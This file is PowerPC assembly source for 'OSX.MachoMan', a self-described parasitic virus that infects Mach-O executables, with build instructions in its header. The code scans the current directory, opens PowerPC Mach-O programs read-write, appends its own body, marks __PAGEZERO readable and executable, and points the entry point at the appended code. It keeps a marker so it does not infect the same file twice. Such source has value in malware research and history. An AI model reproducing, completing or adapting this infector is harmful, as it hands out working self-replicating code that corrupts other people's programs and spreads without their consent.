//OSX.MachoMan by roy g biv
//
//- parasitic direct action infector of PowerPC Mach-O files in current directory
//
//to build this thing:
//gcc
//----
//gcc -arch ppc machoman.s -o machoman

.text
.align 0
.globl _main

Lmacho_begin:
        .ascii  "rgb!"                          ;replaced by host entrypoint
        li      r0, 0x2e00                      ;demo version, current directory only
        stwu    r0, lo16(Ldata - Ldata_end)(r1)
        li      r5, 0
        li      r4, 0
        addi    r3, r1, 2
        li      r0, 5                           ;open
        sc
        nop
        mr      r30, r3
        li      r8, 0
        li      r7, -1
        li      r6, 0x1000                      ;MAP_ANON
        li      r5, 3                           ;PROT_READ | PROT_WRITE
        li      r4, 0x1000
        li      r3, 0
        li      r0, 0xc5                        ;mmap
        sc
        nop
        mr      r29, r3

Lget_ent:
        mr      r6, r1
        li      r5, 0x1000
        mr      r4, r29
        mr      r3, r30
        li      r0, 0xc4                        ;getdirentries
        sc
        nop
        cmpwi   r3, 0
        beq     Lunmap_info
        mr      r28, r29
        add     r27, r29, r3

Ltest_file:
        lbz     r0, lo16(Ld_type - Ldirent)(r28)
        cmpwi   r0, 8                           ;DT_REG
        beq     Lopen_file

Lnext_file:
        lhz     r0, lo16(Ld_reclen - Ldirent)(r28)
        add     r28, r28, r0
        cmpw    r28, r27
        blt     Ltest_file
        b       Lget_ent
        .ascii  "MachoMan - roy g biv"

Lunmap_info:
        li      r4, 0x1000
        mr      r3, r29
        li      r0, 0x49                        ;munmap
        sc
        nop
        mr      r3, r30
        li      r0, 6                           ;close
        sc
        nop
        addi    r1, r1, lo16(Ldata_end - Ldata)
        lwz     r0, 0(0)
        mtlr    r0
        blr
        .ascii  "06/11/06"

Lopen_file:
        li      r5, 0x20                        ;O_EXLOCK
        li      r4, 2                           ;O_RDWR
        la      r3, lo16(Ld_name - Ldirent)(r28)
        li      r0, 5                           ;open
        sc
        b       Lnext_file
        mr      r26, r3
        li      r25, lo16(Lmach_header_end - Lmach_header)
        mr      r5, r25
        la      r4, lo16(Lmach_header - Ldata)(r1)
        li      r0, 3                           ;read
        sc
        nop

;-----------------------------------------------------------------------------
;test if file is infectable (PowerPC format Mach-O, executable, not infected, etc)
;-----------------------------------------------------------------------------

        lwz     r0, lo16(Lmh_magic - Ldata)(r1)
        li      r2, 0
        oris    r2, r2, 0xfeed                  ;MH_MAGICa
        ori     r2, r2, 0xface                  ;MH_MAGICb
        cmpw    r0, r2
        bne     Lclose_file
        lwz     r0, lo16(Lmh_cputype - Ldata)(r1)
        cmpwi   r0, 0x12                        ;CPU_TYPE_POWERPC
        bne     Lclose_file
        lwz     r0, lo16(Lmh_filetype - Ldata)(r1)
        cmpwi   r0, 2                           ;MH_EXECUTE
        bne     Lclose_file
        lwz     r0, lo16(Lmh_ncmds - Ldata)(r1)
        cmpwi   r0, 0
        beq     Lclose_file
        li      r24, 0
        mr      r23, r0

Lexam_cmds:
        li      r5, lo16(Lppc_thread_state_t_end - Lload_command)
        la      r4, lo16(Lload_command - Ldata)(r1)
        mr      r3, r26
        li      r0, 3                           ;read
        sc
        nop
        lwz     r3, lo16(Llc_cmd - Ldata)(r1)
        lwz     r4, lo16(Llc_cmdsize - Ldata)(r1)
        mr      r22, r25
        add     r25, r25, r4
        cmpwi   r3, 1                           ;LC_SEGMENT
        bne     Ltest_thread
        cmpwi   r24, 0
        bne     Lskip_command
        mr      r24, r22
        li      r5, lo16(Lsegment_command_end - Lthread_command_end)
        la      r4, lo16(Lppc_thread_state_t_end - Ldata)(r1)
        mr      r3, r26
        sc
        nop

;-----------------------------------------------------------------------------
;infection marker is that __PAGEZERO protection is non-zero
;-----------------------------------------------------------------------------

        lwz     r0, lo16(Lsc_initprot - Ldata)(r1)
        cmpwi   r0, 0
        bne     Lclose_file

Lskip_command:
        li      r6, 0                           ;SEEK_SET
        mr      r5, r25
        li      r4, 0
        mr      r3, r26
        li      r0, 0xc7                        ;lseek
        sc
        nop
        addic.  r23, r23, -1
        bne     Lexam_cmds

Lclose_file:
        mr      r3, r26
        li      r0, 6                           ;close
        sc
        nop
        b       Lnext_file

Ltest_thread:
        cmpwi   r3, 5                           ;LC_UNIXTHREAD
        bne     Lskip_command
        lwz     r0, lo16(Ltc_flavor - Ldata)(r1)
        cmpwi   r0, 1                           ;PPC_NEW_THREAD_STATE
        bne     Lskip_command
        cmpwi   r24, 0
        beq     Lclose_file
        li      r6, 2                           ;SEEK_END
        li      r5, 0
        li      r4, 0
        mr      r3, r26
        li      r0, 0xc7                        ;lseek
        sc
        nop

;-----------------------------------------------------------------------------
;round up file size to nearest page, then append virus code
;-----------------------------------------------------------------------------

        li      r25, 0x1000
        sub     r25, r25, r4
        andi.   r25, r25, 0xfff
        add     r0, r25, r4
        stw     r0, lo16(Lsc_fileoff - Ldata)(r1)
        li      r23, lo16(Lmacho_end - Lmacho_begin)
        stw     r23, lo16(Lsc_filesize - Ldata)(r1)
        add     r21, r25, r23
        li      r8, 0
        li      r7, -1
        li      r6, 0x1000                      ;MAP_ANON
        li      r5, 3                           ;PROT_READ | PROT_WRITE
        mr      r4, r21
        li      r3, 0
        li      r0, 0xc5                        ;mmap
        sc
        nop
        mr      r20, r3
        mr      r4, r3
        li      r2, -1
        add     r3, r25, r3
        mr      r25, r3
        addi    r3, r3, -1
        mtctr   r23

Lcopy_bytes:
        lbzu    r0, 1(r2)
        stbu    r0, 1(r3)
        bdnz    Lcopy_bytes
        lwz     r0, lo16(Lps_srr0 - Ldata)(r1)
        stw     r0, 0(r25)
        mr      r5, r21
        mr      r3, r26
        li      r0, 4                           ;write
        sc
        nop
        mr      r4, r21
        mr      r3, r20
        li      r0, 0x49                        ;munmap
        sc
        nop
        li      r0, 5                           ;PROT_READ | PROT_EXEC
        stb     r0, lo16(Lsc_maxprot - Ldata)(r1)
        stb     r0, lo16(Lsc_initprot - Ldata)(r1)
        li      r6, 0                           ;SEEK_SET
        addi    r5, r24, 0x20                   ;lo16((load_command_end - load_command) + (sc_fileoff - segment_command))
        li      r4, 0
        mr      r3, r26
        li      r0, 0xc7                        ;lseek
        sc
        nop
        li      r5, lo16(Lsc_nsects - Lsc_fileoff)
        la      r4, lo16(Lsc_fileoff - Ldata)(r1)
        mr      r3, r26
        li      r0, 4                           ;write
        sc
        nop
        li      r6, 0                           ;SEEK_SET
        addi    r5, r22, 0x10                   ;lo16((load_command_end - load_command) + (thread_command_end - thread_command) + (ps_srr0 - ppc_thread_state_t))
        li      r4, 0
        mr      r3, r26
        li      r0, 0xc7                        ;lseek
        sc
        nop

;-----------------------------------------------------------------------------
;new entrypoint is 4, start of __PAGEZERO data
;-----------------------------------------------------------------------------

        li      r5, 4
        stw     r5, lo16(Lps_srr0 - Ldata)(r1)
        la      r4, lo16(Lps_srr0 - Ldata)(r1)
        mr      r3, r26
        li      r0, 4                           ;write
        sc
        nop
        b       Lclose_file

Lmacho_end:

_main:
        li      r0, 0x2e00
        stwu    r0, lo16(Ldata - Ldata_end)(r1)
        li      r5, 0
        li      r4, 0
        addi    r3, r1, 2
        li      r0, 5                           ;open
        sc
        nop
        mr      r30, r3
        li      r8, 0
        li      r7, -1
        li      r6, 0x1000                      ;MAP_ANON
        li      r5, 3                           ;PROT_READ | PROT_WRITE
        li      r4, 0x1000
        li      r3, 0
        li      r0, 0xc5                        ;mmap
        sc
        nop
        mr      r29, r3

L_get_ent:
        mr      r6, r1
        li      r5, 0x1000
        mr      r4, r29
        mr      r3, r30
        li      r0, 0xc4                        ;getdirentries
        sc
        nop
        cmpwi   r3, 0
        beq     L_unmap_info
        mr      r28, r29
        add     r27, r29, r3

L_test_file:
        lbz     r0, lo16(Ld_type - Ldirent)(r28)
        cmpwi   r0, 8                           ;DT_REG
        beq     L_open_file

L_next_file:
        lhz     r0, lo16(Ld_reclen - Ldirent)(r28)
        add     r28, r28, r0
        cmpw    r28, r27
        blt     L_test_file
        b       L_get_ent

L_unmap_info:
        li      r4, 0x1000
        mr      r3, r29
        li      r0, 0x49                        ;munmap
        sc
        nop
        mr      r3, r30
        li      r0, 6                           ;close
        sc
        nop
        li      r5, lo16(Ltxtbody_end - Ltxtbody)
        li      r4, lo16(Ltxtbody)
        li      r3, 1
        li      r0, 4                           ;write
        sc
        nop
        li      r0, 1                           ;exit
        sc

L_open_file:
        li      r5, 0x20                        ;O_EXLOCK
        li      r4, 2                           ;O_RDWR
        la      r3, lo16(Ld_name - Ldirent)(r28)
        li      r0, 5                           ;open
        sc
        b       L_next_file
        mr      r26, r3
        li      r25, lo16(Lmach_header_end - Lmach_header)
        mr      r5, r25
        la      r4, lo16(Lmach_header - Ldata)(r1)
        li      r0, 3                           ;read
        sc
        nop
        lwz     r0, lo16(Lmh_magic - Ldata)(r1)
        li      r2, 0
        oris    r2, r2, 0xfeed                  ;MH_MAGICa
        ori     r2, r2, 0xface                  ;MH_MAGICb
        cmpw    r0, r2
        bne     L_close_file
        lwz     r0, lo16(Lmh_cputype - Ldata)(r1)
        cmpwi   r0, 0x12                        ;CPU_TYPE_POWERPC
        bne     L_close_file
        lwz     r0, lo16(Lmh_filetype - Ldata)(r1)
        cmpwi   r0, 2                           ;MH_EXECUTE
        bne     L_close_file
        lwz     r0, lo16(Lmh_ncmds - Ldata)(r1)
        cmpwi   r0, 0
        beq     L_close_file
        li      r24, 0
        mr      r23, r0

L_exam_cmds:
        li      r5, lo16(Lppc_thread_state_t_end - Lload_command)
        la      r4, lo16(Lload_command - Ldata)(r1)
        mr      r3, r26
        li      r0, 3                           ;read
        sc
        nop
        lwz     r3, lo16(Llc_cmd - Ldata)(r1)
        lwz     r4, lo16(Llc_cmdsize - Ldata)(r1)
        mr      r22, r25
        add     r25, r25, r4
        cmpwi   r3, 1                           ;LC_SEGMENT
        bne     L_test_thread
        cmpwi   r24, 0
        bne     L_skip_command
        mr      r24, r22
        li      r5, lo16(Lsegment_command_end - Lsegment_command)
        la      r4, lo16(Lppc_thread_state_t_end - Ldata)(r1)
        mr      r3, r26
        li      r0, 3                           ;read
        sc
        nop
        lwz     r0, lo16(Lsc_initprot - Ldata)(r1)
        cmpwi   r0, 0
        bne     L_close_file

L_skip_command:
        li      r6, 0                           ;SEEK_SET
        mr      r5, r25
        li      r4, 0
        mr      r3, r26
        li      r0, 0xc7                        ;lseek
        sc
        nop
        addic.  r23, r23, -1
        bne     L_exam_cmds

L_close_file:
        mr      r3, r26
        li      r0, 6                           ;close
        sc
        nop
        b       L_next_file

L_test_thread:
        cmpwi   r3, 5                           ;LC_UNIXTHREAD
        bne     L_skip_command
        lwz     r0, lo16(Ltc_flavor - Ldata)(r1)
        cmpwi   r0, 1                           ;PPC_NEW_THREAD_STATE
        bne     L_skip_command
        cmpwi   r24, 0
        beq     L_close_file
        li      r6, 2                           ;SEEK_END
        li      r5, 0
        li      r4, 0
        mr      r3, r26
        li      r0, 0xc7                        ;lseek
        sc
        nop
        li      r25, 0x1000
        sub     r25, r25, r4
        andi.   r25, r25, 0xfff
        add     r0, r25, r4
        stw     r0, lo16(Lsc_fileoff - Ldata)(r1)
        li      r23, lo16(Lmacho_end - Lmacho_begin)
        stw     r23, lo16(Lsc_filesize - Ldata)(r1)
        add     r21, r25, r23
        li      r8, 0
        li      r7, -1
        li      r6, 0x1000                      ;MAP_ANON
        li      r5, 3                           ;PROT_READ | PROT_WRITE
        mr      r4, r21
        li      r3, 0
        li      r0, 0xc5                        ;mmap
        sc
        nop
        mr      r20, r3
        mr      r4, r3
        li      r2, lo16(Lmacho_begin - 1)
        add     r3, r25, r3
        mr      r25, r3
        addi    r3, r3, -1
        mtctr   r23

L_copy_bytes:
        lbzu    r0, 1(r2)
        stbu    r0, 1(r3)
        bdnz    L_copy_bytes
        lwz     r0, lo16(Lps_srr0 - Ldata)(r1)
        stw     r0, 0(r25)
        mr      r5, r21
        mr      r3, r26
        li      r0, 4                           ;write
        sc
        nop
        mr      r4, r21
        mr      r3, r20
        li      r0, 0x49                        ;munmap
        sc
        nop
        li      r0, 5                           ;PROT_READ | PROT_EXEC
        stb     r0, lo16(Lsc_maxprot - Ldata)(r1)
        stb     r0, lo16(Lsc_initprot - Ldata)(r1)
        li      r6, 0                           ;SEEK_SET
        addi    r5, r24, 0x20                   ;lo16((load_command_end - load_command) + (sc_fileoff - segment_command))
        li      r4, 0
        mr      r3, r26
        li      r0, 0xc7                        ;lseek
        sc
        nop
        li      r5, lo16(Lsc_nsects - Lsc_fileoff)
        la      r4, lo16(Lsc_fileoff - Ldata)(r1)
        mr      r3, r26
        li      r0, 4                           ;write
        sc
        nop
        li      r6, 0                           ;SEEK_SET
        addi    r5, r22, 0x10                   ;lo16((load_command_end - load_command) + (thread_command_end - thread_command) + (ps_srr0 - ppc_thread_state_t))
        li      r4, 0
        mr      r3, r26
        li      r0, 0xc7                        ;lseek
        sc
        nop
        li      r5, 4
        stw     r5, lo16(Lps_srr0 - Ldata)(r1)
        la      r4, lo16(Lps_srr0 - Ldata)(r1)
        mr      r3, r26
        li      r0, 4                           ;write
        sc
        nop
        b       L_close_file

Ldata:
Lmach_header:
Lmh_magic:
Lload_command:
Llc_cmd:
Lsegment_command:
Lsc_segname:
        .long   0
Lmh_cputype:
Llc_cmdsize:
        .long   0
Lmh_cpusubtype:
Lload_command_end:
Lthread_command:
Ltc_flavor:
        .long   0
Lmh_filetype:
Ltc_count:
        .long   0
Lmh_ncmds:
Lsc_vmaddr:
Lthread_command_end:
Lppc_thread_state_t:
Lps_srr0:
        .long   0
Lmh_sizeofcmds:
Lsc_vmsize:
Lppc_thread_state_t_end:
        .long   0
Lmh_flags:
Lsc_fileoff:
        .long   0
Lmach_header_end:
Lsc_filesize:
        .long   0
Lsc_maxprot:
        .long   0
Lsc_initprot:
        .long   0
Lsc_nsects:
        .long   0
Lsegment_command_end:
Ldata_end:

Ldirent:
Ld_fileno:
        .long   0
Ld_reclen:
        .short  0
Ld_type:
        .byte   0
Ld_namlen:
        .byte   0
Ld_name:
        .byte   0

Ltxtbody:
        .ascii  "MachoMan running...\n"
Ltxtbody_end:
        .byte   0
